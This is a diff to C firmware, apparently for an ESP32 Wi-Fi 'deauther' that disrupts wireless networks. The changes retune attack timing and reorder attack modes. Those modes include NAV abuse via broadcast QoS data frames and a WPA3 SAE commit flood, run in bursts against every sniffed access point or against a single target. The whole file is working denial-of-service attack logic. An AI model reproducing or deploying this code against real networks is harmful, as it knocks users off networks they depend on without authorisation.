@@ -9,11 +9,12 @@
 #include "wifi_attacks.h"
 #include "wifiMng.h"
 
+
 #define DEAUTHER_TASK_PRIO 5
 // Syncronization times
 #define CHANNEL_SWITCH_DELAY 12   // Channel switch assestment time
-#define ATTACK_WINDOW        250  // RCO duration
-#define SOFTAP_REST_TIME     150   // Home channel time
+#define ATTACK_WINDOW        150  // RCO duration
+#define SOFTAP_REST_TIME     270   // Home channel time
 
 static const char *TAG = "DEAUTHER";
 static TaskHandle_t deauther_task_handle = NULL;
@@ -130,17 +131,15 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
             break;
         }
 
-        case DEAUTHER_ATTACK_NAV_ABUSE:
+        case DEAUTHER_ATTACK_WPA3_SAE_FLOOD:
         {
-            // L'attacco NAV colpisce tutti sul canale, basta il BSSID
-            wifi_attack_nav_abuse(ap_bssid);
+            wifi_attack_wpa3_sae_flood(ap_bssid);
             break;
         }
 
-        case DEAUTHER_ATTACK_WPA3_SAE_FLOOD:
+        case DEAUTHER_ATTACK_NAV_ABUSE:
         {
-            // Floodiamo l'AP con richieste SAE Commit
-            wifi_attack_wpa3_sae_flood(ap_bssid);
+            wifi_attack_nav_abuse_qos_data_broadcast(ap_bssid);
             break;
         }
 
@@ -216,7 +215,6 @@ static void deauther_send_frames(const target_info_t *target)
         aps_info_t *aps = malloc(sizeof(aps_info_t));
         wifi_sniffer_get_aps(aps);
         if (aps == NULL || aps->count == 0) {
-            vTaskDelay(pdMS_TO_TICKS(100));
             free(aps);
             return;
         }
@@ -248,7 +246,7 @@ static void deauther_send_frames(const target_info_t *target)
                     // Burst di pacchetti
                     for(int k=0; k<5; k++) {
                         execute_attack_on_target(aps->ap[i].bssid, (const char*)aps->ap[i].ssid, current_ch);
-                        ets_delay_us(2000); 
+                        ets_delay_us(5000); 
                     }
                 }
                 if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) break;
@@ -257,6 +255,7 @@ static void deauther_send_frames(const target_info_t *target)
             if (elapsed < (ATTACK_WINDOW - CHANNEL_SWITCH_DELAY)) {
                 vTaskDelay(pdMS_TO_TICKS((ATTACK_WINDOW - CHANNEL_SWITCH_DELAY) - elapsed));
             }
+            /* Wait some time to permit the AP to communicate on his own channel */
             vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
         }
         free(aps);
@@ -269,13 +268,14 @@ static void deauther_send_frames(const target_info_t *target)
         int64_t start_time = esp_timer_get_time();
         while(true) {
             execute_attack_on_target(target->bssid, (const char*)target->ssid, target->channel);
-            ets_delay_us(5000); 
+            vTaskDelay(1); //10 ms
             if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) break;
         }
         int64_t elapsed = (esp_timer_get_time() - start_time) / 1000;
         if (elapsed < (ATTACK_WINDOW - CHANNEL_SWITCH_DELAY)) {
             vTaskDelay(pdMS_TO_TICKS((ATTACK_WINDOW - CHANNEL_SWITCH_DELAY) - elapsed));
         }
+        /* Wait some time to permit the AP to communicate on his own channel */
         vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
     }
 }
@@ -296,7 +296,7 @@ static void deauther_task(void *pvParameters)
     while(true)
     {
         deauther_send_frames(target);
-        vTaskDelay(pdMS_TO_TICKS(100));
+        vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
     }
 }
 
